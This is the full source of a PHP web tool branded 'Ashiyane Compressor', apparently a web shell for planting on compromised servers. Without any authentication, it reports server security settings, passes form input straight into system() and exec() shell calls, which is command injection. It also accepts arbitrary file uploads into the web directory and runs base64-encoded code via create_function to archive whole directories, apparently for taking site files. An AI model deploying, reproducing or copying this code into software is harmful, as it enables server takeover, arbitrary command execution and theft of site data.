<?php

/*
 __  __       _         _ _   _   _ _     _     _            
|  \/  | __ _| |__   __| (_) | | | (_) __| | __| | ___ _ __  
| |\/| |/ _  |  _ \ / _` | | | |_| | |/ _` |/ _` |/ _ \  _ \ 
| |  | | (_| | | | | (_| | |_|  _  | | (_| | (_| |  __/ | | |
|_|  |_|\__ _|_| |_|\__ _|_(_)_| |_|_|\__ _|\__ _|\___|_| |_| ASHIYANE COMPRESSOR V 1.0.0
*/

#Ashiyane Compressor
#Mahdi.Hidden
#Ashiyane Digital Security Team

?>

<?php

if (strtolower(substr(PHP_OS,0,3))=="win")
$sys='win';
else
$sys='unix';
$path = @getcwd();
if($sys == 'win')
{
$path = str_replace("\\", "/", $path);
}

function top(){

global $path;
global $disable_functions;
global $safemode;

if(ini_get("safe_mode")=="1"){
	$safemode="<font color=red>ON</font>";
} else{
	$safemode="<font color=#0F0>OFF</font>";
}
if(ini_get("disable_functions")==""){
	$disable_functions="<font color=#0F0>NONE</font>";
} else{
	$disable_functions=ini_get("disable_functions");
}
$serverip=$_SERVER['SERVER_ADDR'];
$yourip=$_SERVER['REMOTE_ADDR'];
echo "<table style='margin:4px;'>
<tr><td>Server IP: $serverip</td></tr>
<tr><td>Your IP: $yourip</td></tr>
<tr><td>Safe_Mode: $safemode</td></tr>
<tr><td>Disable_Function: $disable_functions</td></tr>
</table>";

}
function bottom(){

echo "<hr>
<center><p><font color='#2677B4'>Mahdi.Hidden</font>
<br>Ashiyane Digital Security Team</p></center>";

}

?>

<html> 
<head> 
<!--
 __  __       _         _ _   _   _ _     _     _            
|  \/  | __ _| |__   __| (_) | | | (_) __| | __| | ___ _ __  
| |\/| |/ _  |  _ \ / _` | | | |_| | |/ _` |/ _` |/ _ \  _ \ 
| |  | | (_| | | | | (_| | |_|  _  | | (_| | (_| |  __/ | | |
|_|  |_|\__ _|_| |_|\__ _|_(_)_| |_|_|\__ _|\__ _|\___|_| |_| ASHIYANE COMPRESSOR V 1.0.0
#Ashiyane Compressor
#Mahdi.Hidden
#Ashiyane Digital Security Team
-->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
<title>Ashiyane Compressor</title> 
<style type="text/css" media="screen"> 
body{
	margin: 0 auto;
	font-family: calibri;
	background:#000;
	color:#fff;
}
.main{
	border:2px #2677B4 solid;
}
.content{
    margin: 2px;
}
.top ul {
	padding: 0;
	margin: 0;
}
.top ul li {
	list-style: none;
	padding: 8px;
	background: #2677B4;
	color: #000;
	font-weight: bold;
	cursor: pointer;
	text-align:center;
	-moz-transition:0.75s;
}
.top ul li:hover {
	background: #1D97F3;
	-moz-transition:0.75s;
}
.top ul a li {
	color: #fff;
	text-shadow: 0 0 5px #000;
}
.top ul li a {
        color:black;
	text-decoration: none;
}

.Buttons ul {
	padding: 0;
	margin: 0;
}
.Buttons ul li {
	list-style: none;
	padding: 8px;
	background: #2677B4;
	color: #000;
	font-weight: bold;
	cursor: pointer;
	text-align:center;
	-moz-transition:0.3s;
	-webkit-transition:0.3s;
	-o-transition:0.3s;
	float:left;
	margin-left:100px;
	/*border-radius:2px;*/
	border:1px solid #fff;
}
.Buttons ul li:hover {
	background: #1D97F3;
	-moz-transition:0.3s;
	-o-transition:0.3s;
	-webkit-transition:0.3s;
	border:1px solid #1D97F3;
}
.Buttons ul a li {
	color: #fff;
	text-shadow: 0 0 5px #000;
}
.Buttons ul li a {
    color:black;
	text-decoration: none;
}
input{
	padding:9px;
}
hr{
	margin-left:-10px;
	border:1px solid #2677B4;
}
.clear{
	clear:both;
}
</style> 
</head>

<body>
<div class="main">
<div class="top">
<ul>
<li><a href="">Ashiyane Compressor V 1.0.0</a></li>
</ul>
<br>
</div>
<div class="content">

<div style="float:left;min-width:900px;max-width:900px;"><br>
<?php top(); ?>
</div>
<div style="float:left;margin-left:100px;">
<div style="font-size:20px;color:red">
<img src="http://ashiyane.org/aboutus/images/logo2.png" /><br>
</div>
</div>
<div class="clear"></div>
<br>
<hr>
<div class="Buttons">
<center>
<ul>

<li><a href="?">Home</a></li>
<li><a href="?action=zip">Zip Compress</a></li>
<li><a href="?action=tar">Tar Compress</a></li>
<li><a href="?action=rar">RAR Compress</a></li>
<li><a href="?action=upl">Upload File</a></li>
<li><a href="?action=abt">About Us</a></li>

</ul>
</center>
</div>
<div class="clear"></div>
<hr>
<?php
if(isset($_GET['action'])){

$action=$_GET['action'];

if($action=="tar"){
?>
<center>
<?php
echo '
<form action="?action=tar" method="post">
<table>
<tr><td>Enter File or Folder Name:</td><td>
<input type="" name="name" size="60" value="'.$path.'">
</td><td><input type="submit" name="submit" value="compress"></td></tr>
</table><br></form>
';
if(isset($_POST['submit'])){

if($safemode=="ON"){
	echo "<font color='red'>Safe Mode Is Enable !</font>";
}
elseif(ini_get("disable_functions")!=""){
	echo "<font color='red'>Functions Disabled !</font>";
} 
elseif($sys=="win"){
	echo "<font color='red'>The System is Windows !</font>";
}
else{
$f=$_POST['name'];
if(system("tar -czf $f.tar.gz $f")){
echo "<font color='green'>Directory Or Files Successfully Compressed!</font>";
} else{
echo "<font color='red'>There is a problem while compressing!</font>";
}
}
}
?>
</center>
<?php
}
if($action=="zip"){

?>
<center>
<?php
if (class_exists('ZipArchive')){
echo '
<center>
<br /><br />
<form actoin="?action=zip" method="post">
<a name="down"></a>
<font color="#FFFFFF"><b>Dir:</b> </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['path']).'" size="60"/><br /><br />
<font color="#FFFFFF"><b>Save Dir: </b></font><input type="text" name="zipfile" value="ashiyane.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
';

$code = base64_decode('ICAgIGlmICghZXh0ZW5zaW9uX2xvYWRlZCgnemlwJykgfHwgIWZpbGVfZXhpc3RzKCRzb3VyY2UpKSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsNCiAgICBpZiAoISR6aXAtPm9wZW4oJGRlc3RpbmF0aW9uLCBaSVBBUkNISVZFOjpDUkVBVEUpKSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAkc291cmNlID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCByZWFscGF0aCgkc291cmNlKSk7DQoNCiAgICBpZiAoaXNfZGlyKCRzb3VyY2UpID09PSB0cnVlKQ0KICAgIHsNCiAgICAgICAgJGZpbGVzID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IobmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRzb3VyY2UpLCBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yOjpTRUxGX0ZJUlNUKTsNCg0KICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpDQogICAgICAgIHsNCiAgICAgICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkZmlsZSk7DQoNCiAgICAgICAgICAgIC8vIElnbm9yZSAiLiIgYW5kICIuLiIgZm9sZGVycw0KICAgICAgICAgICAgaWYoIGluX2FycmF5KHN1YnN0cigkZmlsZSwgc3RycnBvcygkZmlsZSwgJy8nKSsxKSwgYXJyYXkoJy4nLCAnLi4nKSkgKQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAkZmlsZSA9IHJlYWxwYXRoKCRmaWxlKTsNCg0KICAgICAgICAgICAgaWYgKGlzX2RpcigkZmlsZSkgPT09IHRydWUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJHppcC0+YWRkRW1wdHlEaXIoc3RyX3JlcGxhY2UoJHNvdXJjZSAuICcvJywgJycsICRmaWxlIC4gJy8nKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChpc19maWxlKCRmaWxlKSA9PT0gdHJ1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkemlwLT5hZGRGcm9tU3RyaW5nKHN0cl9yZXBsYWNlKCRzb3VyY2UgLiAnLycsICcnLCAkZmlsZSksIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSBpZiAoaXNfZmlsZSgkc291cmNlKSA9PT0gdHJ1ZSkNCiAgICB7DQogICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoYmFzZW5hbWUoJHNvdXJjZSksIGZpbGVfZ2V0X2NvbnRlbnRzKCRzb3VyY2UpKTsNCiAgICB9DQoNCiAgICByZXR1cm4gJHppcC0+Y2xvc2UoKTs=');


	
if(isset($_POST['ziper']) && ($_POST['ziper'] == '>>'))
{
$newfunc = create_function('$source,$destination', $code);

$dirzip = $_POST['dirzip'];
$zipfile = $_POST['zipfile'];
if($newfunc($dirzip, $zipfile)){
echo '<b><span style="color:green">Directory Or File Ziped Successfully !</span></b><Br>';
}else {echo '<b><span style="color:red">Error!!!...</span></b><Br>';}
}
}
else {
echo '
<center>
<br /><br />
<form action="?action=zip" method="post">
<a name="down"></a>
Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['path']).'" size="60"/><br /><br />
Save Dir: <input type="text" name="zipfile" value="ashiyane.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
';
if(isset($_POST['ziper']) && ($_POST['ziper'] == '>>'))

{
$dirzip = trim($_POST['dirzip']);
$zipfile = trim($_POST['zipfile']);
if(exec("zip -r $zipfile $dirzip")){
echo '<b><span style="color:green">Directory Or File Ziped Successfully !</span></b><br>';
}else {echo '<b><span style="color:red">ERROR!!!...</span></b><br>';}
}
}

?>

</center>

<?php
}

if($action=="rar"){
	echo "<center><br>Under Construction ... !</br></center>";
}
if($action=="upl"){
?>
<center>
<?php
echo '<form action="" method="post" enctype="multipart/form-data">
	<table>
	<tr><td>Upload File:</td><td><input type="file" name="userfile"></td><td><input type="submit" name="upload" value="Upload"></td>
	</table>
	</form>';
	if(isset($_POST['upload'])){
if(!@move_uploaded_file($_FILES['userfile']['tmp_name'], $_FILES['userfile']['name'])){
	echo "<b><font color='red'>Can't upload file</font><b><br>";
	} else{
	echo "<b><font color='green'>Successfully Uploaded!</font><b><br>";
	}
	}
?>
</center>
<?php
}

if($action=="abt"){
?>
		<center>
        <img src="http://ashiyane.org/aboutus/images/logo2.png" /><br />
   		<span style="color:#F00;font-size:20px">ASHIYANE COMPRESSOR V 1.0.0</span><br />
        <span>Coded By <font color="#2677B4">Mahdi.Hidden</font></span><br />
        <span>Ashiyane Digital Security Team</span><br />
		</center>
<?php
}
}
if(!isset($_GET['action']) or $action==""){

echo "<center><p><b>Ashiyane PowerFull Compressor V 1.0.0</b><br>Cod3d By <font color='#2677B4'>Mahdi.Hidden</font>
<br>Ashiyane Digital Security Team<br></p></center>";
}

?>
</div>
</div>
</body>
</head>